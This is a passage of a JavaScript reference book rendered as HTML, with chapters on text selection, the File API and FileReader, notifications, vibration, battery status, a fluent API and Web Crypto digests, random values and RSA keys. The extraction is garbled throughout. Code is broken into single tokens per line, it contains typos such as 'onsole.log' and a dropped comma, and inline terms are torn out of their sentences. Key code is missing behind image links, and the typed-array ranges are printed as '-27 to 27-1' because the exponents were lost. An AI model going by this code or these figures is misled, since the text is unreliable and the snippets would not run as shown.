If the node is a Text node, it is the number of characters from the
beginning of startNode to where the
endOffset range ends. Otherwise, it is the number of child nodes
between the beginning of startNode to where the range ends.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch88-1">Section 88.1: Get the text of the selection</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
**let**
sel
=
document.
getSelection
(
)
;
**let**
text
=
sel.
toString
(
)
;
onsole.
log
(
text
)
;
// <i>logs what the user selected*
Alternatively, since the toString member function is called
automatically by some functions when converting the object to a
string, you don&apos;t always have to call it yourself.
console.
log
(
document.
getSelection
(
)
)
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch88-2">Section 88.2: Deselect everything that is selected</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
**let**
sel
=
document.
getSelection
(
)
;
sel.
removeAllRanges
(
)
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch88-3">Section 88.3: Select the contents of an element</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
**let**
sel
=
document.
getSelection
(
)
;
**let**
myNode
=
document.
getElementById
(
&apos;element-to-select&apos;
)
;
**let**
range
=
document.
createRange
(
)
;
range.
selectNodeContents
(
myNode
)
;
sel.
addRange
(
range
)
;
It may be necessary to first remove all the ranges of the previous
selection, as most browsers don&apos;t support multiple ranges.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch89">Chapter 89: File API, Blobs and FileReaders</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
  **Property/Method**         **Description**
  error                       A error that occurred while reading the
                              file.
  readyState                  Contains the current state of the
                              FileReader.
  result                      Contains the file contents.
  onabort                     Triggered when the operation is aborted.
  onerror                     Triggered when an error is encountered.
  onload                      Triggered when the file has loaded.
  onloadstart                 Triggered when the file loading operation
                              has started.
  onloadend                   Triggered when the file loading operation
                              has ended.
  onprogress                  Triggered whilst reading a Blob.
  abort
() Aborts the current operation.
readAsArrayBuffer                                      (   blob
) Starts reading the file as an ArrayBuffer.
readAsDataURL                                       (   blob
) Starts reading the file as a data url/uri.
readAsText                  (   blob       &lbrack;,   encoding
Starts reading the file as a text file. Not able to read binary files.
Use
&rbrack;)
readAsArrayBuffer instead.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch89-1">Section 89.1: Read file as string</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Make sure to have a file input on your page:
**&lt;**
**input**
type
=
&quot;file&quot;
id
=
&quot;upload&quot;
**&gt;**
Then in JavaScript:
document.
getElementById
(
&apos;upload&apos;
)
.
addEventListener
(
&apos;change&apos;
,
readFileAsString
)
**function**
readFileAsString
(
)
{
**var**
files
=
**this**
.
files
;
**if**
(
files.
length
===
0
)
{
console.
log
(
&apos;No file is selected&apos;
)
;
**return**
;
}
**var**
reader
=
**new**
FileReader
(
)
;
reader.
onload
=
**function**
(
event
)
{
console.
log
(
&apos;File content:&apos;
,
event.
target
.
result
)
;
}
;
reader.
readAsText
(
files
&lbrack;
0
&rbrack;
)
;
}
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch89-2">Section 89.2: Read file as dataURL</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
type = &quot;file&quot;
Reading the contents of a file within a web application can be
accomplished by utilizing the HTML5 File API. First, add an input with
in your HTML:
**&lt;**
**input**
type
=
&quot;file&quot;
id
=
&quot;upload&quot;
**&gt;**
Next, we&apos;re going to add a change listener on the file-input. This
examples defines the listener via JavaScript, but it could also be
added as attribute on the input element. This listener gets triggered
every time a new file has been selected. Within this callback, we can
read the file that was selected and perform further actions (like
creating an image with the contents of the selected file):
document.
getElementById
(
&apos;upload&apos;
)
.
addEventListener
(
apos;change&apos;
showImage
)
;
**function**
showImage
(
evt
)
{
**var**
files
=
evt.
target
.
files
;
**if**
(
files.
length
===
0
)
{
console.
log
(
&apos;No files selected&apos;
)
;
**return**
;
}
**var**
reader
=
**new**
FileReader
(
)
;
reader.
onload
=
**function**
(
event
)
{
**var**
img
=
**new**
Image
(
)
;
img.
onload
=
**function**
(
)
{
document.
body
.
appendChild
(
img
)
;
}
;
img.
src
=
event.
target
.
result
;
}
;
reader.
readAsDataURL
(
files
&lbrack;
0
&rbrack;
)
;
}
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch89-3">Section 89.3: Slice a file</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
blob.slice
The () method is used to create a new Blob object containing the data
in the specified range of bytes of the source Blob. This method is
usable with File instances too, since File extends Blob.

Here we slice a file in a specific amount of blobs. This is useful
especially in cases where you need to process files that are too large
to read in memory all in once. We can then read the chunks one by one
using FileReader.
<i>/&ast;&ast;*
*&ast; &bsol;@param {File&vert;Blob} - file to slice*
*&ast; &bsol;@param {Number} - chunksAmount*
*&ast; &bsol;@return {Array} - an array of Blobs*
*&ast;&ast;/*
**function**
sliceFile
(
file
,
chunksAmount
)
{
**var**
byteIndex
=
0
;
**var**
chunks
=
&lbrack;
&rbrack;
;
**for**
(
**var**
i
=
0
;
i
&lt;
chunksAmount
;
i
+=
1
)
{
**var**
byteEnd
=
Math
.
ceil
(
(
file.
size
/
chunksAmount
)
&ast;
(
i
&plus;
1
)
)
;
chunks.
push
(
file.
slice
(
byteIndex
,
byteEnd
)
)
;
byteIndex
+=
(
byteEnd
&minus;
byteIndex
)
;
}
**return**
chunks
;
}
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch89-4">Section 89.4: Get the properties of the file</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
If you want to get the properties of the file (like the name or the
size) you can do it before using the File Reader. If we have the
following html piece of code:
**&lt;**
**input**
type
=
&quot;file&quot;
id
=
&quot;newFile&quot;
**&gt;**
You can access the properties directly like this:
document.
getElementById
(
&apos;newFile&apos;
)
.
addEventListener
(
&apos;change&apos;
,
getFile
)
;
**function**
getFile
(
event
)
{
**var**
files
=
event.
target
.
files
,
file
=
files
&lbrack;
0
&rbrack;
;
console.
log
(
&apos;Name of the file&apos;
,
file.
name
)
;
console.
log
(
&apos;Size of the file&apos;
,
file.
size
)
;
}
You can also get easily the following attributes: lastModified
(Timestamp), lastModifiedDate (Date), and type (File
Type)
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch89-5">Section 89.5: Selecting multiple files and restricting file types</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
The HTML5 file API allows you to restrict which kind of files are
accepted by simply setting the accept attribute on a file input, e.g.:
**&lt;**
**input**
type
=
&quot;file&quot;
accept
=
&quot;image/jpeg&quot;
**&gt;**
image             /   jpeg           ,   image             /   png
Specifying multiple MIME types separated by a comma (e.g. ) or using
wildcards (e.g.
image<i>/&ast;*
for allowing all types of images) give you a quick and powerful way to
restrict the type of files you want to select. Here&apos;s an example for
allowing any image or video:
**&lt;**
**input**
type
=
&quot;file&quot;
accept
=
&quot;image/&ast;,video&ast;&quot;
**&gt;**
By default, the file input lets the user select a single file. If you
want to enable multiple file selection, simply add the multiple
attribute:
**&lt;**
**input**
type
=
&quot;file&quot;
multiple
**&gt;**
You can then read all the selected files via the file input&apos;s files
array. See read file as dataUrl
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch89-6">Section 89.6: Client side csv download using Blob</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
**function**
downloadCsv
(
)
{
**var**
blob
=
**new**
Blob
(
&lbrack;
csvString
&rbrack;
)
;
**if**
(
window.
navigator
.
msSaveOrOpenBlob
)
{
window.
navigator
.
msSaveBlob
(
blob
,
&quot;filename.csv&quot;
)
;
}
**else**
{
**var**
a
=
window.
document
.
createElement
(
&quot;a&quot;
)
;
a&period;
href
=
window.
URL
.
createObjectURL
(
blob
,
{
type
:
&quot;text/plain&quot;
}
)
;
a&period;
download
=
&quot;filename.csv&quot;
;
document.
body
.
appendChild
(
a
)
;
a&period;
click
(
)
;
document.
body
.
removeChild
(
a
)
;
}
}
**var**
string
=
&quot;a1,a2,a3&quot;
;
downloadCSV
(
string
)
;
Source reference ; <https://github.com/mholt/PapaParse/issues/175>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch90">Chapter 90: Notifications API</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch90-1">Section 90.1: Requesting Permission to send notifications</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Notification.requestPermission
We use to ask the user if he/she wants to receive notifications from
our website.
Notification.
requestPermission
(
**function**
(
)
{
**if**
(
Notification.
permission
===
&apos;granted&apos;
)
{
// <i>user approved.*
// <i>use of new Notification(&hellip;) syntax will now be successful*
}
**else**
**if**
(
Notification.
permission
===
&apos;denied&apos;
)
{
// <i>user denied.*
}
**else**
{
// <i>Notification.permission === &apos;default&apos;*
// <i>user didn*
'
*t make a decision.*
// <i>You can*
'
*t send notifications until they grant permission.*
}
}
)
;
.requestPermission
Since Firefox 47 The method can also return a promise when handling
the user&apos;s decision for granting permission
Notification.
requestPermission
(
)
.
then
(
**function**
(
permission
)
{
**if**
(
!
(
&apos;permission&apos;
**in**
Notification
)
)
{
Notification.
permission
=
permission
;
}
// <i>you got permission !*
}
,
**function**
(
rejection
)
{
// <i>handle rejection here.*
}
)
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch90-2">Section 90.2: Sending Notifications</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
After the user has approved a request for permission to send
notifications, we can send a simple notification that says Hello to
the user: **new** Notification(&apos;Hello&apos;, { body: &apos;Hello, world!&apos;,
icon: &apos;url to an .ico image&apos; });

This will send a notification like this:

**Hello**

Hello, world!
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch90-3">Section 90.3: Closing a notification</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
.close()
You can close a notification by using the method.
**let**
notification
=
**new**
Notification
(
title
,
options
)
;
// <i>do some work, then close the notification*
notification.
close
(
)
You can utilize the setTimeout function to auto-close the notification
sometime in the future.
**let**
notification
=
**new**
Notification
(
title
,
options
)
;
setTimeout
(
(
)
=&gt;
{
notification.
close
(
)
}
,
4000
)
;
The above code will spawn a notification and close it after 4 seconds.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch90-4">Section 90.4: Notification events</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
The Notification API specifications support 2 events that can be fired
by a Notification.
1.  The click event.
This event will run when you click on the notification body (excluding
the closing X and the Notifications configuration button).
Example:
notification.
onclick
=
**function**
(
event
)
{
console.
debug
(
&quot;you click me and this is my event object: &quot;
,
event
)
;
}
2.  The error event
The notification will fire this event whenever something wrong will
happen, like being unable to display
notification.
onerror
=
**function**
(
event
)
{
console.
debug
(
&quot;There was an error: &quot;
,
event
)
;
}
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch91">Chapter 91: Vibration API</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Modern mobile devices include hardware for vibrations. The Vibration
API offers Web apps the ability to access this hardware, if it exists,
and does nothing if the device doesn&apos;t support it.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch91-1">Section 91.1: Single vibration</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Vibrate the device for 100ms:
window.
navigator
.
vibrate
(
100
)
;
or
window.
navigator
.
vibrate
(
&lbrack;
100
&rbrack;
)
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch91-2">Section 91.2: Check for support</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Check if browser supports vibrations
**if**
(
&apos;vibrate&apos;
**in**
window.
navigator
)
// <i>browser has support for vibrations*
**else**
// <i>no support*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch91-3">Section 91.3: Vibration patterns</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
An array of values describes periods of time in which the device is
vibrating and not vibrating.
window.
navigator
.
vibrate
(
&lbrack;
200
,
100
,
200
&rbrack;
)
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch92">Chapter 92: Battery Status API</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch92-1">Section 92.1: Battery Events</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
// <i>Get the battery API*
navigator.
getBattery
(
)
.
then
(
**function**
(
battery
)

{
battery.
addEventListener
(
&apos;chargingchange&apos;
,
**function**
(
)
{
console.
log
(
&apos;New charging state: &apos;
,
battery.
charging
)
;
}
)
;
battery.
addEventListener
(
&apos;levelchange&apos;
,
**function**
(
)
{
console.
log
(
&apos;New battery level: &apos;
,
battery.
level
&ast;
100
&plus;
&quot;%&quot;
)
;
}
)
;
battery.
addEventListener
(
&apos;chargingtimechange&apos;
,
**function**
(
)
{
console.
log
(
&apos;New time left until full: &apos;
,
battery.
chargingTime
,
&quot; seconds&quot;
)
;
}
)
;
battery.
addEventListener
(
&apos;dischargingtimechange&apos;
,
**function**
(
)
{
console.
log
(
&apos;New time left until empty: &apos;
,
battery.
dischargingTime
,
&quot; seconds&quot;
)
;
}
)
;
}
)
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch92-2">Section 92.2: Getting current battery level</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
// <i>Get the battery API*
navigator.
getBattery
(
)
.
then
(
**function**
(
battery
)
{
// <i>Battery level is between 0 and 1, so we multiply it by 100 to get in
percents*
console.
log
(
&quot;Battery level: &quot;
&plus;
battery.
level
&ast;
100
&plus;
&quot;%&quot;
)
;
}
)
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch92-3">Section 92.3: Is battery charging?</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
// <i>Get the battery API*
navigator.
getBattery
(
)
.
then
(
**function**
(
battery
)
{
**if**

battery.
charging
)
{
console.
log
(
&quot;Battery is charging&quot;
)
;
}
**else**
{
console.
log
(
&quot;Battery is discharging&quot;
)
;
}
}
)
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch92-4">Section 92.4: Get time left until battery is empty</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
// <i>Get the battery API*
navigator.
getBattery
(
)
.
then
(
**function**
(
battery
)
{
console.
log
(
&quot;Battery will drain in &quot;
,
battery.
dischargingTime
,
&quot; seconds&quot;
)
;
}
)
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch92-5">Section 92.5: Get time left until battery is fully charged</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
// <i>Get the battery API*
navigator.
getBattery
(
)
.
then
(
**function**
(
battery
)
{
console.
log
(
&quot;Battery will get fully charged in &quot;
,
battery.
chargingTime
,
&quot; seconds&quot;
)
;
}
)
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch93">Chapter 93: Fluent API</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
JavaScript is great for designing fluent API - a consumer-oriented API
with focus on developer experience. Combine with language dynamic
features for optimal results.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch93-1">Section 93.1: Fluent API capturing construction of HTML articles with JS</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
![](./images/image042.png){width="7.486805555555556in"
height="8.873611111111112in"}
![](./images/image043.png){width="7.486805555555556in"
height="5.711805555555555in"}
This allows the consumer of the API to have a nice-looking article
construction, almost a DSL for this purpose, using plain JS:
<h5>Version ≥ 6</h5>
**const** articles = &lbrack;
Article.withTopic(&apos;Artificial Intelligence - Overview&apos;)
.section(&apos;What is Artificial Intelligence?&apos;)
.addParagraph(&apos;Something something&apos;)
.addParagraph(&apos;Lorem ipsum&apos;)
.withEmphasis()
.section(&apos;Philosophy of AI&apos;)
.addParagraph(&apos;Something about AI philosophy&apos;)
.addParagraph(&apos;Conclusion&apos;),
Article.withTopic(&apos;JavaScript&apos;)
.list(&apos;JavaScript is one of the 3 languages all web developers must
learn:&apos;)
.addListItem(&apos;HTML to define the content of web pages&apos;)
.addListItem(&apos;CSS to specify the layout of web pages&apos;)
.addListItem(&apos; JavaScript to program the behavior of web pages&apos;)
&rbrack;; document.getElementById(&apos;content&apos;).innerHTML = articles.map(a
=&bsol;a.toHtml()).join(&apos;**&bsol;&bsol;n**&apos;);
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch94">Chapter 94: Web Cryptography API</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch94-1">Section 94.1: Creating digests (e.g. SHA-256)</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
// <i>Convert string to ArrayBuffer. This step is only necessary if you
wish to hash a string, not if*
*you already got an ArrayBuffer such as an Uint8Array.*
**var**
input
=
**new**
TextEncoder
(
&apos;utf-8&apos;
)
.
encode
(
&apos;Hello world!&apos;
)
;
// <i>Calculate the SHA-256 digest*
crypto.
subtle
.
digest
(
&apos;SHA-256&apos;
,
input
)
// <i>Wait for completion*
.
then
(
**function**
(
digest
)
{
// <i>digest is an ArrayBuffer. There are multiple ways to proceed.*
// <i>If you want to display the digest as a hexadecimal string, this will
work:*
**var**
view
=
**new**
DataView
(
digest
)
;
**var**
hexstr
=
&apos;&apos;
;
**for**
(
**var**
i
=
0
;
i
&lt;
view.
byteLength
;
i
++
)
{
**var**
b
=
view.
getUint8
(
i
)
;
hexstr
+=
&apos;0123456789abcdef&apos;
&lbrack;
(
b
&
0xf0
)
&gt;&gt;
4
&rbrack;
;
hexstr
+=
&apos;0123456789abcdef&apos;
&lbrack;
(
b
&
0x0f
)
&rbrack;
;
}
console.
log
(
hexstr
)
;
// <i>Otherwise, you can simply create an Uint8Array from the buffer:*
**var**
digestAsArray
=
**new**
Uint8Array
(
digest
)
;
console.
log
(
digestAsArray
)
;
}
)
// <i>Catch errors*
.
**catch**
(
**function**
(
err
)
{
console.
error
(
err
)
;
}
)
;
SHA-1 , SHA-256         ,   SHA-384         and       SHA-512
The current draft suggests to provide at least , but this is no strict
requirement and subject to change. However, the SHA family can still
be considered a good choice as it will likely be supported in all
major browsers.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch94-2">Section 94.2: Cryptographically random data</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
// <i>Create an array with a fixed size and type.*
**var**
array
=
**new**
Uint8Array
(
5
)
;
// <i>Generate cryptographically random values*
crypto.
getRandomValues
(
array
)
;
// <i>Print the array to the console*
console.
log
(
array
)
;
[crypto.getRandomValues(array)](https://developer.mozilla.org/en-US/docs/Web/API/RandomSource/getRandomValues)
can be used with instances of the following classes (described further
in Binary Data) and will generate values from the given ranges (both
ends inclusive):
Int8Array: -27 to 27-1
Uint8Array: 0 to 28-1
Int16Array: -215 to 215-1 Uint16Array: 0 to 216-1
Int32Array: -231 to 231-1
Uint32Array: 0 to 231-1
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch94-3">Section 94.3: Generating RSA key pair and converting to PEM format</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
In this example you will learn how to generate RSA-OAEP key pair and
how to convert private key from this key pair to base64 so you can use
it with OpenSSL etc. Please note that this process can also be used
for public key you just have to use prefix and suffix below:

&minus;&minus;&minus;&bsol;
BEGIN PUBLIC KEY
&minus;&minus;&minus;&bsol;
&minus;&minus;&minus;&bsol;
END PUBLIC KEY
&minus;&minus;&minus;&bsol;
NOTE: This example is fully tested in these browsers: Chrome, Firefox,
Opera, Vivaldi

![](./images/image044.png){width="7.486805555555556in"
height="8.324305555555556in"}

console.
log
(
pem
)
;
}
)
.
**catch**
(
**function**
(
err
)
{
console.
log
(
err
)
;
}
)
;
}
)
;
That&apos;s it! Now you have a fully working and compatible RSA-OAEP
Private Key in PEM format which you can use wherever you want. Enjoy!
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch94-4">Section 94.4: Converting PEM key pair to CryptoKey</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
So, have you ever wondered how to use your PEM RSA key pair that was
generated by OpenSSL in Web Cryptography API? If the answers is yes.
Great! You are going to find out.

NOTE: This process can also be used for public key, you only need to
change prefix and suffix to:
&minus;&minus;&minus;&bsol;
BEGIN PUBLIC KEY
&minus;&minus;&minus;&bsol;
&minus;&minus;&minus;&bsol;
END PUBLIC KEY
&minus;&minus;&minus;&bsol;
This example assumes that you have your RSA key pair generated in PEM.

![](./images/image045.png){width="7.486805555555556in"
height="6.270138888888889in"}

And now you&apos;re done! You can use your imported key in WebCrypto API.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch95">Chapter 95: Security issues</h2>
